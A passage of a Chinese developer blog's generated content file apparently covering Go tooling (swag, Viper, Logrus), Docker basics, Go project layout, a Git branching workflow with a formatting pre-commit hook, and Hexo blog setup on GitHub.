OpenAPI 规范构建的开源工具，可帮助开发人员设计、构建、记录和使用 REST API，支持文档在线自动生成以及接口功能测试。基于OpenAPI规范编写注解或通过扫描代码去生成注解，就能生成统一标准的接口文档和一系列 <a href="https://github.com/swagger-api">Swagger 工具</a>。</p><p>以下以<a href="https://github.com/swaggo/swag">go swagger</a>为例，说明如何为代码自动生成接口文档。</p><p><strong>环境准备</strong></p><blockquote><p><strong>安装swgger</strong></p></blockquote><p><code>go install github.com/swaggo/swag/cmd/swag@latest</code></p><blockquote><p><strong>支持的web框架</strong></p></blockquote><pre><code>ginbuffalonet/http...</code></pre><p><strong>swagger使用</strong></p><p>接口文档的生成过程：首先按照规范给接口代码（controller层）添加声明式注释，接着使用swagger工具扫描代码自动生成api接口文档数据，然后渲染在线接口文档页面。 </p><blockquote><p><strong>添加注释</strong></p></blockquote><p>注释规范说明</p><p><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/API.png" alt="api declarative comments format"></p><pre class=" language-shell"><code class="language-shell">@Summary      摘要@Description  详细的说明@Tags         每个API操作的标签列表，以逗号分隔。@Accept       API可以使用的MIME类型列表，只影响具有请求正文的操作，例如POST、PUT、PATCH@Produce      可以产生的 MIME 类型列表，MIME 类型可以简单的理解为响应类型，例如：json、xml、html 等等@Param        参数格式，从左到右分别为：参数名、入参类型、数据类型、是否必填、注释@Success      响应成功，从左到右分别为：状态码、参数类型、数据类型、注释@Failure      响应失败，从左到右分别为：状态码、参数类型、数据类型、注释@Router       路由，从左到右分别为：路由地址，HTTP 方法</code></pre><p>具体例子</p><pre><code>// ShowAccount godoc////@SummaryShow an account//@Descriptionget string by ID//@Tagsaccounts//@Acceptjson//@Producejson//@Paramidpathinttrue&quot;Account ID&quot;//@Success200&#123;object&#125;model.Account//@Failure400&#123;object&#125;httputil.HTTPError//@Failure404&#123;object&#125;httputil.HTTPError//@Failure500&#123;object&#125;httputil.HTTPError//@Router/accounts/&#123;id&#125; [get]// UploadAccountImage godoc////@SummaryUpload account image//@DescriptionUpload file//@Tagsaccounts//@Acceptmultipart/form-data//@Producejson//@Paramidpathinttrue&quot;Account ID&quot;//@ParamfileformDatafiletrue&quot;account image&quot;//@Success200&#123;object&#125;controller.Message//@Failure400&#123;object&#125;httputil.HTTPError//@Failure404&#123;object&#125;httputil.HTTPError//@Failure500&#123;object&#125;httputil.HTTPError//@Router/accounts/&#123;id&#125;/images [post]</code></pre><blockquote><p><strong>生成接口文档</strong></p></blockquote><p>在包含main.go文件的项目根目录运行<code>swag init</code>，解析注释并生成需要的文件（<code>docs</code>文件夹和<code>docs/docs.go</code>）</p><pre class=" language-shell"><code class="language-shell"># swag 生成命令swag init . </code></pre><p>如果部分接口不需要生成接口文档，则使用排除命令。</p><pre class=" language-shell"><code class="language-shell"># swag 排除命令swag init -d ./ --exclude ./app/api/v2</code></pre><p>确保导入了生成的<code>docs/docs.go</code>文件，这样特定的配置文件才会被初始化。</p><pre><code>//注册路由处import (   _ &quot;xxx/docs&quot;   //导入生成的docs)</code></pre><p>(可选) 可以使用<code>fmt</code>格式化 SWAG 注释。</p><pre><code>swag fmt</code></pre><blockquote><p><strong>渲染文档数据</strong></p></blockquote><p>注册swagger api相关路由，可以自定义文档格式，也可使用现有工具的渲染，例如gin-swagger的swaggerFiles.Handler</p><pre><code>    swagger := e.Group(&quot;swagger&quot;, middleware.SwaggerBasicAuth())    &#123;        swagger.GET(&quot;/*any&quot;, api.Swagger.HandleReDoc)    &#125;</code></pre><p>项目运行后，浏览器访问定义的文档地址即可查看</p><blockquote><p><strong>Swag cli</strong></p></blockquote><pre class=" language-shell"><code class="language-shell">swag init -hNAME:swag init - Create docs.goUSAGE:swag init [command options] [arguments...]OPTIONS:--generalInfo value, -g value          API通用信息所在的go源文件路径，如果是相对路径则基于API解析目录 (默认: "main.go")--dir value, -d value                  API解析目录 (默认: "./")--exclude value                        解析扫描时排除的目录，多个目录可用逗号分隔（默认：空）--propertyStrategy value, -p value     结构体字段命名规则，三种：snakecase,camelcase,pascalcase (默认: "camelcase")--output value, -o value               文件(swagger.json, swagger.yaml and doc.go)输出目录 (默认: "./docs")--parseVendor                          是否解析vendor目录里的go源文件，默认不--parseDependency                      是否解析依赖目录中的go源文件，默认不--markdownFiles value, --md value      指定API的描述信息所使用的markdown文件所在的目录--generatedTime                        是否输出时间到输出文件docs.go的顶部，默认是--codeExampleFiles value, --cef value  解析包含用于 x-codeSamples 扩展的代码示例文件的文件夹，默认禁用--parseInternal                        解析 internal 包中的go文件，默认禁用--parseDepth value                     依赖解析深度 (默认: 100)--instanceName value                   设置文档实例名 (默认: "swagger")</code></pre><pre class=" language-shell"><code class="language-shell">swag fmt -hNAME:   swag fmt - format swag commentsUSAGE:   swag fmt [command options] [arguments...]OPTIONS:   --dir value, -d value          API解析目录 (默认: "./")   --exclude value                解析扫描时排除的目录，多个目录可用逗号分隔（默认：空）   --generalInfo value, -g value  API通用信息所在的go源文件路径，如果是相对路径则基于API解析目录 (默认: "main.go")   --help, -h                     show help (default: false)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> swagger </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-配置篇 | Go</title>
+      <link href="/technique/24.html"/>
+      <url>/technique/24.html</url>
+      
+        <content type="html"><![CDATA[<p><a href="https://github.com/spf13/viper">Viper</a>是适用于Go的配置管理工具。它被设计用于在应用程序中工作，并且可以处理多种类型的配置需求和格式。Viper支持:</p><ul><li>设置默认值</li><li>从JSON、TOML、YAML、HCL、envfile和Java properties格式的配置文件读取配置信息</li><li>实时监控和重新读取配置文件（可选）</li><li>从环境变量中读取</li><li>从远程配置系统（etcd或Consul）读取并监控配置变化</li><li>从命令行参数读取配置</li><li>从buffer读取配置</li><li>显式配置值</li></ul><p>Viper会按照如下优先级读取配置:</p><ul><li>显示调用Set设置值</li><li>命令行参数（flag）</li><li>环境变量</li><li>配置文件</li><li>key&#x2F;value存储</li><li>默认值</li></ul><blockquote><p>设置默认值<br>默认值是可选的，但如果没有通过配置文件、环境变量、远程配置或命令行标志（flag）设置值，设置默认值则具有重要性。</p></blockquote><pre><code>viper.SetDefault(&quot;ContentDir&quot;, &quot;content&quot;)viper.SetDefault(&quot;LayoutDir&quot;, &quot;layouts&quot;)viper.SetDefault(&quot;Taxonomies&quot;, map[string]string&#123;&quot;tag&quot;: &quot;tags&quot;, &quot;category&quot;: &quot;categories&quot;&#125;)</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> develop </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-日志篇 | Go</title>
+      <link href="/technique/21.html"/>
+      <url>/technique/21.html</url>
+      
+        <content type="html"><![CDATA[<p><a href="https://github.com/sirupsen/logrus">Logrus</a> 是 Go 的结构化日志记录库，与标准库中的日志模块完全兼容。</p><blockquote><p><strong>logrus安装</strong></p></blockquote><pre><code>go install github.com/sirupsen/logrus@latest</code></pre><blockquote><p><strong>logrus使用</strong></p></blockquote><p>在使用 logrus 时，鼓励用 <code>log.WithFields(log.Fields&#123;&#125;).Fatal()</code> 这种方式替代 <code>log.Fatalf(&quot;Failed to send event %s to topic %s with key %d&quot;)</code>， 以结构化日志输出。</p><pre><code>log.WithFields(log.Fields&#123;  &quot;event&quot;: event,  &quot;topic&quot;: topic,  &quot;key&quot;: key,&#125;).Fatal(&quot;Failed to send event&quot;)</code></pre><p>若想让重复出现的字段始终附加日志语中，可以将其设置为默认字段，通过创建一个 logrus.Entry来实现</p><pre><code>requestLogger := log.WithFields(log.Fields&#123;&quot;request_id&quot;: request_id, &quot;user_ip&quot;: user_ip&#125;)requestLogger.Info(&quot;something happened on that request&quot;) # will log request_id and user_iprequestLogger.Warn(&quot;something not great happened&quot;)</code></pre><ul><li>日志输出级别</li></ul><p>Logrus日志级别共有7类，警告级别从低到高低依次为：Trace, Debug, Info, Warning, Error, Fatal and Panic</p><pre><code>log.Trace(&quot;Something very low level.&quot;)log.Debug(&quot;Useful debugging information.&quot;)log.Info(&quot;Something noteworthy happened!&quot;)log.Warn(&quot;You should probably take a look at this.&quot;)log.Error(&quot;Something failed but I&#39;m not quitting.&quot;)// Calls os.Exit(1) after logginglog.Fatal(&quot;Bye.&quot;)// Calls panic() after logginglog.Panic(&quot;I&#39;m bailing.&quot;)</code></pre><p>设置日志输出警告级别</p><pre><code>log.SetLevel(log.WarnLevel) </code></pre><ul><li>日志输出格式</li></ul><p>Logrus内置了JSONFormatter 和 TextFormatter，来定义输出的日志格式。实际开发中，也可以自定义输出格式。</p><p>设置内置日志输出格式</p><pre><code>log.SetFormatter(&amp;log.JSONFormatter&#123;    TimestampFormat: &quot;2006-01-02 15:04:05&quot;, &#125;)//Log as JSON instead of the default ASCII formatter.log.SetFormatter(&amp;log.JSONFormatter&#123;&#125;)log.SetFormatter(&amp;log.TextFormatter&#123;    TimestampFormat: &quot;2006-01-02 15:04:05&quot;,     DisableColors: true,    FullTimestamp: true,&#125;)//Log as Text instead of the default ASCII formatter.log.SetFormatter(&amp;log.TextFormatter&#123;&#125;)</code></pre><p>自定义日志格式</p><p>如下所示，可以参考SetFormatter方法中的参数Formatter， 使用该接口自定义日志格式，其包含 Format 方法，方法内有一个struct类型数据 *Entry， Entry.Data 是所有字段集合，Fields 类型为 map[string]interface{}</p><pre><code>// SetFormatter sets the logger formatter.func (logger *Logger) SetFormatter(formatter Formatter) &#123;    logger.mu.Lock()    defer logger.mu.Unlock()    logger.Formatter = formatter&#125;type Formatter interface &#123;    Format(*Entry) ([]byte, error)&#125;type Entry struct &#123;    Logger *Logger    // Contains all the fields set by the user.    Data Fields    // Time at which the log entry was created    Time time.Time    // Level the log entry was logged at: Trace, Debug, Info, Warn, Error, Fatal or Panic    // This field will be set on entry firing and the value will be equal to the one in Logger struct field.    Level Level    // Calling method, with package name    Caller *runtime.Frame    // Message passed to Trace, Debug, Info, Warn, Error, Fatal or Panic    Message string    // When formatter is called in entry.log(), a Buffer may be set to entry    Buffer *bytes.Buffer    // Contains the context set by the user. Useful for hook processing etc.    Context context.Context    // err may contain a field formatting error    err string&#125;</code></pre><p>自定义日志格式例子</p><pre><code>type MyJSONFormatter struct &#123;&#125;log.SetFormatter(new(MyJSONFormatter))func (f *MyJSONFormatter) Format(entry *Entry) ([]byte, error) &#123;  // Note this doesn&#39;t include Time, Level and Message which are available on  // the Entry. Consult `godoc` on information about those fields or read the  // source of the official loggers.  serialized, err := json.Marshal(entry.Data)    if err != nil &#123;      return nil, fmt.Errorf(&quot;Failed to marshal fields to JSON, %w&quot;, err)    &#125;  return append(serialized, &#39;\n&#39;), nil&#125;</code></pre><ul><li>日志输出方式</li></ul><p>设置日志输出方式</p><pre><code>// Output to stdout instead of the default stderrlog.SetOutput(os.Stdout)// Can be any io.Writer, see below for File examplelogfile, err := os.OpenFile(&quot;./logrus.log&quot;, os.O_CREATE|os.O_WRONLY|os.O_APPEND,0644)if err == nil &#123;    log.SetOutput(logfile) &#125; else &#123;    log.Info(&quot;Failed to log to file, using default stderr&quot;)&#125;</code></pre><ul><li>日志输出内容</li></ul><p>如果希望将调用方法添加为字段，可以设置</p><pre><code>log.SetReportCaller(true)</code></pre><p>日志输出</p><pre><code>&#123;&quot;animal&quot;:&quot;penguin&quot;,&quot;level&quot;:&quot;fatal&quot;,&quot;method&quot;:&quot;github.com/sirupsen/arcticcreatures.migrate&quot;,&quot;msg&quot;:&quot;a penguin swims by&quot;,&quot;time&quot;:&quot;2014-03-10 19:57:38.562543129 -0400 EDT&quot;&#125;</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> logs </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-docker篇</title>
+      <link href="/technique/20.html"/>
+      <url>/technique/20.html</url>
+      
+        <content type="html"><![CDATA[<p>应用程序通过隔离实现在运行时相互独立互不干扰，目前实现隔离的方式包括：虚拟机、容器。<br>与虚拟机通过操作系统实现隔离不同，容器技术只隔离应用程序的运行时环境，而容器之间可以共享同一个操作系统。在这里，运行时环境指的是程序运行所需的各种库和配置。</p><p><a href="https://docs.docker.com/">docker官方文档地址</a><br>Docker 是一个开源的容器化平台，用于构建、部署和运行应用程序。它可以让开发者打包应用以及依赖项到一个轻量级、可移植的容器中，该容器可以在任何支持Docker的环境中运行。<br>Docker 使用的架构是 C&#x2F;S 架构，包括 Docker 客户端和 Docker 服务器。Docker 客户端通过 RESTful API 与 Docker 服务器通信，Docker 服务器负责管理 Docker 镜像、容器等资源。</p><p>Docker解决了以下问题：</p><ul><li>环境不一致</li><li>隔离性</li><li>弹性伸缩</li></ul><h3 id="Docker安装"><a href="#Docker安装" class="headerlink" title="Docker安装"></a>Docker安装</h3><p>官方地址：<a href="https://docs.docker.com/get-docker/">docs.docker.com&#x2F;get-docker</a><br>检查安装版本：<code>docker --version</code></p><h3 id="Docker基本概念"><a href="#Docker基本概念" class="headerlink" title="Docker基本概念"></a>Docker基本概念</h3><ul><li>Dokerfile<blockquote><p>Docker builds images by reading the instructions from a Dockerfile. A Dockerfile is a text file containing instructions for building your source code.<br>用来构建 Docker 镜像的文本文件，包含了一系列指令，用于描述如何构建镜像。通过 Dockerfile，用户可以定义镜像的基础操作系统、安装依赖、配置环境变量等步骤，以及容器启动时需要执行的命令</p></blockquote></li><li>Docker Images<blockquote><p>Docker images consist of layers. Each layer is the result of a build instruction in the Dockerfile. Layers are stacked sequentially, and each one is a delta representing the changes applied to the previous layer.<br>是一个只读的模板，包含了运行容器所需的文件系统、应用程序和配置等信息。可以通过 Dockerfile 来构建 Docker 镜像，也可以从 Docker 仓库中拉取现有的镜像。</p></blockquote></li><li>Docker Container<blockquote><p>A container is a standard unit of software that packages up code and all its dependencies so the application runs quickly and reliably from one computing environment to another.<br>是 Docker 镜像的可运行实例，类似于一个轻量级、独立的虚拟机。每个容器都运行在独立的环境中，包含自己的文件系统、进程空间等，但与宿主机共享内核。</p></blockquote></li><li>Docker Compose<blockquote><p>Docker Compose is a tool for defining and running multi-container applications. It is the key to unlocking a streamlined and efficient development and deployment experience.<br>用于定义和运行多容器 Docker 应用的工具。通过一个单独的 YAML 文件（通常命名为 docker-compose.yml），用户可以定义多个容器的配置，包括镜像、环境变量、网络设置等，然后使用一个命令就可以启动、停止或删除整个应用。</p></blockquote></li><li>Docker Registry<blockquote><p>Docker registry stores Docker images. Docker Hub is a public registry that anyone can use, and Docker is configured to look for images on Docker Hub by default. You can also run your own private registry.<br>用于存储 Docker 镜像，可以分为公共仓库（如 Docker Hub）和私有仓库。用户可以将自己构建的 Docker 镜像推送到仓库中，也可以从仓库中拉取他人分享的镜像。</p></blockquote></li></ul><p>docker启动&#x2F;停止命令：</p><pre><code>systemctl stop dockersystemctl start dockersystemctl restart docker</code></pre><p>docker状态查看：<code>systemctl status docker</code><br>docker信息查看：<code>docker info</code><br>docker镜像查看：<code>docker images</code><br>docker镜像删除：<code>docker rmi 镜像标识</code><br>docker容器查看：<code>docker ps -a</code></p><p>Dockerfile编写</p><pre><code>FROM：指定基础镜像名称和版本，将打包的项目在该基础镜像上运行LABEL：为镜像添加元数据，可以用于标识镜像的作者、版本、描述等信息（可忽略）ENV：设置环境变量，可以在容器内部使用WORKDIR：设置工作目录，用于指定容器内部的工作目录，后续的命令都将在该目录下执行COPY：从本地复制文件至创建的镜像文件RUN: 对创建的镜像使用的命令CMD: 容器被创建启动时执行的命令</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> docker </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-目录结构 | Go</title>
+      <link href="/technique/19.html"/>
+      <url>/technique/19.html</url>
+      
+        <content type="html"><![CDATA[<p>如果仅是一个简单的功能，项目的布局并不需要精心设计。而在项目逐渐扩大的过程中，保持良好的代码结构非常重要。如果不注意，最终可能会得到一个混乱的代码，其中包含大量隐藏的依赖项和全局状态。当项目有更多的参与者时，也需要更多的组织结构。因此，了解如何有效地管理包和库、组织项目的布局是非常重要的。</p><p>项目的目录结构没有统一的模板，不同项目的目录结构，要依据项目类型、大小及灵活程度做调整，但也遵循一定的规范。</p><blockquote><p><strong>命名要求和规范</strong></p></blockquote><ol><li><p>命名清晰：目录命名要清晰、简洁，不要太长，也不要太短。目录名要能清晰地表达出该目录实现的功能，并且目录名最好用单数（特殊情况，如 &#x2F;docs、&#x2F;examples）。一方面是因为单数足以说明这个目录的功能，另一方面可以统规范，避免单复混用的情况。</p></li><li><p>功能明确：一个目录所要实现的功能应该是明确的、并且在整个项目目录中具有很高的辨识度。当需要新增一个功能时，我们能够非常清楚地知道把这个功能放在哪个目录下。</p></li><li><p>全面性：目录结构应该尽可能全面地包含研发过程中需要的功能，例如文档、脚本、源码管理、API 实现、工具、第三方包、测试、编译产物等</p></li><li><p>可观测性：项目规模一定是从小到大的，所以一个好的目录结构应该能够在项目变大时，仍然保持之前的目录结构。</p></li><li><p>可扩展性：每个日录下存放了同类的功能，在项目变大时，这些目录应该可以存放更多同类功能。</p></li></ol><blockquote><p><strong>MVC模式</strong></p></blockquote><p>MVC（Model View Controller）是软件工程中的一种软件架构模式，该模式将用户界面和业务逻辑分离，以使代码可扩展性、可复用性、可维护性、灵活性加强。它把软件系统分为三个基本部分：模型（model）、视图（view）、控制器（controller）。</p><p>View层是界面，Model层是业务逻辑，Controller层用来调度View层和Model层，将用户界面和业务逻辑合理的组织在一起，起粘合剂的效果。</p><p>Golang项目目录结构也有一些MVC的影子。</p><blockquote><p><strong>示例目录结构</strong></p></blockquote><ul><li><p><a href="https://github.com/golang-standards/project-layout">golang-standards&#x2F;project-layout</a></p><pre><code>├── api  ├── assets├── build├── cmd├── configs├── deployments├── docs├── examples├── githooks├── go.mod├── init├── internal├── LICENSE.md├── Makefile├── pkg├── README_zh-CN.md├── scripts├── test├── third_party├── tools├── vendor├── web└── website  </code></pre></li><li><p><a href="https://github.com/flipped-aurora/gin-vue-admin">gin-vue-admin</a></p><pre><code>├── server    ├── api             (api层)    │   └── v1          (v1版本接口)    ├── config          (配置包)    ├── core            (核心文件)    ├── docs            (swagger文档目录)    ├── global          (全局对象)                        ├── initialize      (初始化)                            │   └── internal    (初始化内部函数)                                ├── middleware      (中间件层)                            ├── model           (模型层)                        │   ├── request     (入参结构体)                            │   └── response    (出参结构体)                                ├── packfile        (静态文件打包)                            ├── resource        (静态资源文件夹)                            │   ├── excel       (excel导入导出默认路径)                            │   ├── page        (表单生成器)                            │   └── template    (模板)                                ├── router          (路由层)                        ├── service         (service层)                        ├── source          (source层)                        └── utils           (工具包)                            ├── timer       (定时器接口封装)                                └── upload      (oss接口封装)</code></pre></li><li><p>示例</p><pre><code>├── conf        (配置初始化)├── cache       (缓存处理)├── controller  (请求入口)├── biz         (业务逻辑)├── errorcode   (错误处理)├── format      (格式化数据处理)├── logs        (日志)├── middleware  (中间件)├── model       (数据关系映射)├── request     (参数处理)├── router      (路由)├── service     (服务底层处理/远程调用)├── utils        (工具类)</code></pre></li><li><p>示例</p><pre><code>├── app                (应用)    ├── api            (控制层)    ├── consts         (常量定义)    ├── dao            (数据层)        ├── internal   (模型生成)    ├── middleware     (中间件)    ├── model          (处理数据类型定义)    ├── request        (请求返回定义)    ├── service        (服务层)├── conf               (配置项)├── core               (核心)├── docs               (文档生成)├── logs               (日志)├── router             (路由)├── utils              (工具)</code></pre></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> develop </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>项目开发-Git操作篇</title>
+      <link href="/technique/18.html"/>
+      <url>/technique/18.html</url>
+      
+        <content type="html"><![CDATA[<h3 id="一些资源"><a href="#一些资源" class="headerlink" title="一些资源"></a>一些资源</h3><ul><li>Git书籍<a href="https://git-scm.com/book/en/v2">Pro Git book</a></li><li>学习Git操作的在线游戏小网站 <a href="https://learngitbranching.js.org/?locale=zh_CN">Learn Git Branching</a></li><li>工作中常用的Git操作<a href="https://juejin.cn/post/6844903586120335367?searchId=202307211637490692F188E23F90BD2F63">Git常用操作总结</a></li></ul><h3 id="Git流程规范"><a href="#Git流程规范" class="headerlink" title="Git流程规范"></a>Git流程规范</h3><p>  业务层服务后端使用Git进行版本控制需要遵循一定的工作流程，以下是一种常用的流程。</p><blockquote><p><strong>分支命名方法</strong></p></blockquote><ol><li>生产环境使用 master 分支，测试环境使用 dev 分支</li><li>其它开发分支命名规则如下：</li></ol><ul><li><p>bug 修复分支</p><p>bugfix-项目名称-描述 如：bugfix-feature-description</p></li><li><p>功能开发分支 </p><p>feat-项目名称-描述 如：feat-feature-description</p></li></ul><p>  长期分支存在两个：用于生产环境的 master 分支，用于测试环境的 dev 分支</p><p>  临时分支有三类：用于新增功能的 feat- 分支， 用于 bug 修复的 bugfix- 分支，用于发布前的 release-* 分支</p><blockquote><p><strong>新功能开发</strong></p></blockquote><ol><li>从线上主干拉取最新的稳定代码</li></ol><pre><code>拉取最新的稳定主干分支git checkout mastergit pull origin master创建对应功能分支git checkout -b feat-feature-description完成代码开发git push origin feat-feature-description</code></pre><ol><li>合并功能分支至测试环境 dev 分支</li></ol><pre><code>git checkout devgit merge feat-feature-descriptiongit push origin dev</code></pre><ol start="2"><li>测试通过，创建发布分支</li></ol><pre><code>git checkout mastergit checkout -b release-*git merge feat-feature-descriptiongit merge feat-*...git checkout mastergit merge release-*git push origin mastergit checkout dev</code></pre><ol start="3"><li>删除相应的临时分支</li></ol><pre><code>git push origin :feat-feature-descriptiongit push origin :release-*...git branch -d feat-feature-descriptiongit branch -d release-*</code></pre><blockquote><p><strong>缺陷修复</strong></p></blockquote><p>   在第二步时创建对应的 bugfix-* 分支，其它步骤同功能开发。</p><pre><code>git checkout mastergit pull origin mastergit checkout -b bugfix-*...git checkout devgit merge bugfix-*git push origin dev...git checkout mastergit merge bugfix-*git push origin master...</code></pre><blockquote><p><strong>代码检查</strong></p></blockquote><p>   增加 pre-commit 钩子进行提交前代码检查<br>   对 imports 进行更新，添加需引入的依赖，去除不使用的依赖<br>   对代码风格进行检查<br>   对代码进行格工化<br>   对代码语法进行静态检查<br>   运行单元测试</p><ul><li>安装依赖的工具<pre><code>go get golang.org/x/tools/cmd/goimportsgo install golang.org/x/tools/cmd/goimportsgo get golang.org/x/lint/golintgo install golang.org/x/lint/golint</code></pre></li><li>pre-commit文件内容<pre><code>#!/bin/sh STAGED_GO_FILES=$(git diff --cached --name-only --diff-filter=ACM | grep &quot;.go$&quot;) if [[ &quot;$STAGED_GO_FILES&quot; = &quot;&quot; ]]; then    exit 0fi PASS=true for FILE in $STAGED_GO_FILESdo    # 跳过vendor目录下的文件    if [[ $FILE == &quot;vendor&quot;* ]];then        continue    fi     # goimports 检查并调整导入语句    goimports -w $FILE    if [[ $? != 0 ]]; then        PASS=false    fi     # golint 检查代码风格,给出提示    golint &quot;-set_exit_status&quot; $FILE    if [[ $? == 1 ]]; then        PASS=false    fi     # go tool vet 检查代码中的静态错误    # go vet $FILE    # if [[ $? != 0 ]]; then    #     PASS=false    # fi     # 如果当前文件没有被格式化，就格式化它    UNFORMATTED=$(gofmt -l $FILE)    if [[ &quot;$UNFORMATTED&quot; != &quot;&quot; ]];then        gofmt -w $PWD/$UNFORMATTED        if [[ $? != 0 ]]; then            PASS=false        fi    fi     # 上述 goimports, gofmt可能会对文件作出改动，    # 所以此处将更改提交至暂存区    git add $FILE done if ! $PASS; then    printf &quot;\033[31mCOMMIT FAILED \033[0m\n&quot;    exit 1else    printf &quot;\033[32mCOMMIT SUCCEEDED \033[0m\n&quot;fi exit 0</code></pre></li></ul><blockquote><p><strong>需要注意</strong></p></blockquote><ul><li>严禁直接在 master 分支提交代码</li><li>严禁直接在 dev 分支提交代码</li><li>在 dev 分支因调试进行的代码修改必须切回对应的功能或缺陷修复分支后进行提交</li><li>创建发布分支是为了避免有些开发好的功能因特殊原因取消上到正式环境的情况，避免手工剔除代码，如果功能确认上到正式环境，可省略这一步</li><li>临时分支在开发完成上到正式环境 稳定后（最多一周）必须删除，防止分支堆积造成混淆</li><li>不要把调试代码签入版本控制</li><li>git log 需要明确写出更改的部分</li><li>合并冲突问题本地解决</li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> technique </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> git </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>hexo+github+material博客搭建</title>
+      <link href="/technique/17.html"/>
+      <url>/technique/17.html</url>
+      
+        <content type="html"><![CDATA[<p>此前是使用typecho模板+阿里云服务器搭建的博客，由于某次忘记续费导致网站关闭，临时联系客服续费备份了网站和数据库文件。</p><p>考虑到后续的一些开销，于是转战github网站免费托管。而typecho是动态渲染的，不适用github的托管服务。因此网站框架也改用为hexo。</p><blockquote><p>  hexo 是一个静态博客生成工具，具备编译 Markdown、拼接主题模板、生成 HTML、上传 Git 或 FTP 等基本功能。</p></blockquote><p>建站是主要参考了hexo官方文档<a href="https://hexo.io/zh-cn/docs/index.html">参考链接</a>和U2647’s blog（<a href="https://zdran.com/20180326.html">参考链接</a>）</p><h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><ul><li><p>Nodejs <a href="https://nodejs.org/zh-cn">下载地址</a></p><p>Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本</p><p>检查是否安装成功</p><pre><code>PS C:\Windows\System32&gt; node -vv16.14.2PS C:\Windows\System32&gt; npm -v8.5.0</code></pre></li><li><p>Git <a href="https://git-scm.com/downloads">下载地址</a><br>检查是否安装成功</p><pre><code>PS C:\Windows\System32&gt; git --versiongit version 2.35.1.windows.</code></pre></li></ul><h2 id="博客搭建"><a href="#博客搭建" class="headerlink" title="博客搭建"></a>博客搭建</h2><h3 id="hexo部署"><a href="#hexo部署" class="headerlink" title="hexo部署"></a>hexo部署</h3><p>建议首先阅读hexo官方文档</p><ul><li><p>安装hexo</p><p>将hexo的功能封装为命令，提供给用户通过 hexo server &#x2F; hexo deploy 等命令调用的模块，就是 hexo-cli（hexo-Command Line Interface）。</p><p>终端输入：</p><p><code>npm install -g hexo-cli</code></p></li><li><p>博客初始化</p><p>新建一个用于存放hexo博客的空文件夹，进入该文件夹，终端输入：</p><p><code>hexo init</code></p><p>该命令执行相当于</p><ul><li>Git clone hexo-starter 和 hexo-theme-landscape 主题到当前目录（指定文件夹时，则到指定目录）。</li><li>下载依赖。</li></ul><p>此时，博客文件夹的文件结构如下：</p><pre><code>. ├── _config.yml           网站的配置信息├── package.json          应用程序的信息├── scaffolds             文章模版├── source                用户资源|     └── _posts          *├── themes                主题     ├── node_modules   ├── .github├── .gitignore├── _config.landscape.yml  └──  yarn.lock    </code></pre><blockquote><p>*除 _posts 文件夹之外，开头命名为 _ (下划线)的文件 &#x2F; 文件夹和隐藏的文件将会被忽略。Markdown 和 HTML 文件会被解析并放到 public 文件夹，而其他文件会被拷贝过去。</p></blockquote><p>接着，生成静态文件：</p><p><code>hexo generate</code>  缩写：<code>hexo g</code></p><p>然后，启动服务器（默认情况下，访问网址为： <a href="http://localhost:4000/">http://localhost:4000/</a> ）：</p><p><code>hexo server</code>    缩写：<code>hexo s</code> </p><p>访问网站查看博客部署情况，页面显示如下，则成功：<br><img src="https://cdn.jsdelivr.net/gh/etamsylate-pupu/Image-host/blogImg/hexoBlog/20230420161436.png" alt="hexo"></p></li></ul><h3 id="主题配置"><a href="#主题配置" class="headerlink" title="主题配置"></a>主题配置</h3><p>hexo安装时默认使用landscape主题，我使用的是material主题，虽然主题最近的更新时间都是好几年前，但是还是能用用的！</p><ul><li><p>下载material主题</p><p>在博客目录，终端输入：</p><pre><code>cd themesgit clone git@github.com:iblh/hexo-theme-material.git material</code></pre></li><li><p>修改网站配置</p><p>修改博客主目录下的网站配置文件_config.yml中的theme值，将值修改为安装的主题文件夹名称。（网站配置文件每项的含义可以仔细阅读注释或者查看官方文档）</p><p><code>theme: material</code></p></li><li><p>主题配置</p><p>首先将theme&#x2F;material 目录下_config.template.yml 重命名为 _config.yml</p><p>阅读material主题的文档<a href="https://neko-dev.github.io/material-theme-docs/#/">链接</a>，自定义主题配置项。</p><p>这里分享常用的配置：</p><ul><li>侧边栏<pre><code># Sidebar Customizesidebar:    dropdown:        Email Me:        link: &quot;mailto: 你的邮箱&quot;        icon: email    homepage:        use: true        icon: home        divider: false    archives:        use: true        icon: inbox        divider: false    categories:        use: true        icon: chrome_reader_mode        divider: true    pages:          标签云:             link: &quot;/tags&quot;            icon: cloud            divider: false        时间轴:            link: &quot;/timeline&quot;            icon: timeline             divider: true        友链:            link: &quot;/links&quot;            icon: links            divider: false        关于:            name: 关于            link: &quot;/about&quot;            icon: person            divider: true    article_num:        use: true        divider: false    footer:        divider: true        theme: false        support: false        feedback: false        material: false</code></pre></li></ul></li></ul><h3 id="提交部署"><a href="#提交部署" class="headerlink" title="提交部署"></a>提交部署</h3><ul><li><p>安装部署插件</p><ul><li><p>git类型<br>终端输入：</p><p><code>npm install hexo-deployer-git --save</code></p><p>对应的网站配置项</p><pre><code>deploy:  type: git  repo: &lt;repository url&gt;   branch: [branch]  message: 